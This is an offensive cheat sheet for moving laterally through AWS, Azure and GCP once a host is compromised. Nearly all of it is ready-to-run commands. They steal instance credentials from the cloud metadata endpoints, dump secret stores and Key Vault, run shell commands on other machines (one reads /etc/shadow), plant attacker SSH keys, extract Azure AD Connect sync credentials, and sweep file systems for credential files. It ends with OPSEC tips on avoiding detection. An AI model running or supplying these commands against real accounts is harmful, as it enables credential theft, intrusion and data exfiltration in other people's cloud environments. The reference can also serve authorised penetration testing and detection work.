# Cloud Lateral Movement Reference

## AWS Lateral Movement

### Metadata Service Pivot (from compromised EC2)
```
# IMDSv1 — no authentication required
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>
# Returns: AccessKeyId, SecretAccessKey, Token (temporary creds)

# IMDSv2 — requires token header
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Use stolen instance role credentials
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
aws sts get-caller-identity    # Verify identity
```

### Cross-Account Role Assumption
```
# Assume role in another account
aws sts assume-role \
  --role-arn arn:aws:iam::<TARGET_ACCOUNT>:role/<ROLE_NAME> \
  --role-session-name pivot-session

# Use returned credentials
export AWS_ACCESS_KEY_ID=...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...

# Enumerate what the assumed role can do
aws iam list-attached-role-policies --role-name <ROLE_NAME>
aws iam get-role-policy --role-name <ROLE_NAME> --policy-name <POLICY>
```

### Service-to-Service Pivot
```
# EC2 → Lambda (if role allows)
aws lambda list-functions
aws lambda invoke --function-name <FUNC> output.txt

# EC2 → S3 (search for secrets)
aws s3 ls
aws s3 cp s3://<BUCKET>/.env ./stolen_env
aws s3 ls s3://<BUCKET> --recursive | grep -iE 'credential|password|key|secret|env'

# EC2 → SSM (Systems Manager — move to other instances)
aws ssm describe-instance-information
aws ssm start-session --target <INSTANCE_ID>
aws ssm send-command --instance-ids <ID> --document-name "AWS-RunShellScript" --parameters 'commands=["whoami"]'

# EC2 → Secrets Manager
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id <SECRET_NAME>

# EC2 → Parameter Store
aws ssm get-parameters-by-path --path "/" --recursive --with-decryption
```

### EC2 Instance Connect / SSM
```
# Push SSH key to instance (temporary — 60 seconds)
aws ec2-instance-connect send-ssh-public-key \
  --instance-id <ID> \
  --instance-os-user ec2-user \
  --ssh-public-key file://~/.ssh/id_rsa.pub
ssh ec2-user@<INSTANCE_IP>
```

---

## Azure Lateral Movement

### Managed Identity Token Theft
```
# From compromised Azure VM — get management token
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Get Key Vault token
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net"

# Get Graph API token
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com"

# Use stolen token
az account get-access-token    # If az CLI available
# Or use REST API directly with Authorization: Bearer <token>
```

### Service Principal Abuse
```
# Login as service principal
az login --service-principal -u <APP_ID> -p <SECRET> --tenant <TENANT_ID>

# Enumerate permissions
az role assignment list --assignee <APP_ID>
az ad app list --all

# If SP has Contributor on subscription:
az vm list
az vm run-command invoke -g <RG> -n <VM> --command-id RunShellScript --scripts "whoami"
az vm run-command invoke -g <RG> -n <VM> --command-id RunPowerShellScript --scripts "whoami"
```

### Resource-to-Resource Pivot
```
# VM → Key Vault
az keyvault list
az keyvault secret list --vault-name <VAULT>
az keyvault secret show --vault-name <VAULT> --name <SECRET>

# VM → Storage Account
az storage account list
az storage container list --account-name <ACCOUNT> --auth-mode login
az storage blob list --container-name <CONTAINER> --account-name <ACCOUNT> --auth-mode login

# VM → Azure SQL
az sql server list
az sql db list --server <SERVER> --resource-group <RG>

# VM → Other VMs via Run Command
az vm run-command invoke -g <RG> -n <VM_NAME> --command-id RunShellScript --scripts "id; cat /etc/shadow"
```

### Hybrid Identity (Azure AD Connect)
```
# If Azure AD Connect server is compromised:
# Extract sync credentials
# Location: C:\Program Files\Microsoft Azure AD Sync\
# Database: ADSync (LocalDB)
# Use AADInternals PowerShell module:
Import-Module AADInternals
Get-AADIntSyncCredentials    # Returns AD and Azure AD credentials
```

---

## GCP Lateral Movement

### Metadata Service
```
# Get access token from metadata (from compromised instance)
curl -H "Metadata-Flavor: Google" \
  http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token

# Get full service account email
curl -H "Metadata-Flavor: Google" \
  http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email

# List available scopes
curl -H "Metadata-Flavor: Google" \
  http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/scopes

# Project-wide SSH keys
curl -H "Metadata-Flavor: Google" \
  http://169.254.169.254/computeMetadata/v1/project/attributes/ssh-keys
```

### Service Account Key Abuse
```
# Activate stolen service account key
gcloud auth activate-service-account --key-file=sa-key.json

# Enumerate access
gcloud projects list
gcloud compute instances list --project <PROJECT>
gcloud iam service-accounts list --project <PROJECT>

# Impersonate another service account
gcloud auth print-access-token --impersonate-service-account=<SA_EMAIL>
```

### Instance-to-Instance Movement
```
# SSH via OS Login or project SSH keys
gcloud compute ssh <INSTANCE> --zone <ZONE>

# Execute command on instance
gcloud compute ssh <INSTANCE> --zone <ZONE> --command "whoami"

# If compute.admin — add SSH key to instance metadata
gcloud compute instances add-metadata <INSTANCE> --zone <ZONE> \
  --metadata ssh-keys="attacker:$(cat ~/.ssh/id_rsa.pub)"
```

### Resource Pivot
```
# Access Cloud Storage
gsutil ls
gsutil ls gs://<BUCKET>
gsutil cp gs://<BUCKET>/secrets.txt ./

# Access Secret Manager
gcloud secrets list --project <PROJECT>
gcloud secrets versions access latest --secret <SECRET>

# Access Cloud SQL
gcloud sql instances list
gcloud sql connect <INSTANCE> --user root
```

---

## Cross-Cloud Pivot Patterns
```
# Common scenarios:
# 1. AWS instance with Azure AD credentials in environment → pivot to Azure
# 2. Azure VM with GCP service account key in mounted storage → pivot to GCP
# 3. Any cloud VM → search for other cloud provider credentials:
env | grep -iE 'AWS|AZURE|GOOGLE|GCP'
find / -name "credentials" -o -name "*.json" -o -name ".env" 2>/dev/null | xargs grep -l 'private_key\|aws_access\|client_secret' 2>/dev/null
```

---

## OPSEC Notes
- Metadata API access is local and generates no external alerts
- Cross-account role assumption generates CloudTrail AssumeRole events
- Azure Run Command generates activity log entries
- GCP OS Login generates audit logs for SSH connections
- Service-to-service pivots are harder to detect than direct admin actions
- Always check IAM policies before attempting actions — failures are logged
- Use temporary credentials (STS) over long-lived keys when possible
